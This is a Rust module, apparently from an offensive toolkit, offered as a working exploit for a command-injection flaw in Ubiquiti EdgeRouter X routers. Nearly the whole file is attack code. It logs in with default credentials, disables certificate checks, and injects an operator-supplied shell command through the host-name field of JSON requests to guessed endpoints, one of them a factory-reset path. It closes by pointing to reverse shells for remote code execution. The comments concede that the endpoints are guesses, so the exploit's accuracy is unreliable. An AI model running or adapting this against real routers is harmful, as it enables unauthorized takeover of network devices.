use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};
use urlencoding;

/// Ubiquiti EdgeRouter X Command Injection (CVE-2023-2376)
/// 
/// Exploits command injection in the Web Management Interface.
/// Affects EdgeRouter X up to version 2.0.9-hotfix.6.
/// 
/// Reference: github.com/leetsun/IoT/tree/main/EdgeRouterX/CI/8

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    let base_url = if target_ip.contains("://") {
        target_ip.clone()
    } else {
        format!("https://{}", target_ip)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // Authentication required
    let username = prompt_default("Username", "ubnt")?;
    let password = prompt_default("Password", "ubnt")?;
    
    let cmd = prompt_default("Command to execute", "id")?;
    
    println!("{} Authenticating...", "[*]".blue());
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .timeout(Duration::from_secs(15))
        .build()?;
    
    // EdgeRouter uses a login form
    let login_url = format!("{}/", base_url.trim_end_matches('/'));
    
    let login_body = format!(
        "username={}&password={}",
        urlencoding::encode(&username),
        urlencoding::encode(&password)
    );
    
    let login_res = client.post(&login_url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(login_body)
        .send()
        .await
        .context("Login request failed")?;
    
    if !login_res.status().is_success() && !login_res.status().is_redirection() {
        println!("{} Login failed (HTTP {}). Check credentials.", "[-]".red(), login_res.status());
        return Ok(());
    }
    
    println!("{} Authentication successful!", "[+]".green());
    
    // CVE-2023-2376 injection point
    // The vulnerability is in the web management interface's command handling
    println!("{} Sending command injection payload...", "[*]".blue());
    
    // Command injection via vulnerable parameter
    // The exact endpoint varies; this is based on the PoC structure
    let injection = format!(";{};", cmd);
    
    // Try common injection endpoints
    let endpoints = vec![
        format!("{}/api/edge/operation/factory-reset.cgi", base_url.trim_end_matches('/')),
        format!("{}/api/edge/batch.json", base_url.trim_end_matches('/')),
    ];
    
    for endpoint in &endpoints {
        let payload = serde_json::json!({
            "SET": {
                "system": {
                    "host-name": injection
                }
            }
        });
        
        let res = client.post(endpoint)
            .json(&payload)
            .send()
            .await;
            
        match res {
            Ok(r) => {
                let status = r.status();
                let text = r.text().await.unwrap_or_default();
                
                if status.is_success() {
                    println!("{} Endpoint {} responded!", "[+]".green(), endpoint);
                    println!("{} Response: {}", "[*]".blue(), text.chars().take(200).collect::<String>());
                    break;
                }
            },
            Err(e) => {
                println!("{} Endpoint {} failed: {}", "[*]".dimmed(), endpoint, e);
            }
        }
    }
    
    println!();
    println!("{} Command injection attempted.", "[*]".yellow());
    println!("{} For RCE, use reverse shell payloads.", "[*]".cyan());
    println!("{} Affected: EdgeRouter X <= 2.0.9-hotfix.6", "[*]".dimmed());

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    Ubiquiti EdgeRouter X Command Injection (CVE-2023-2376)║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
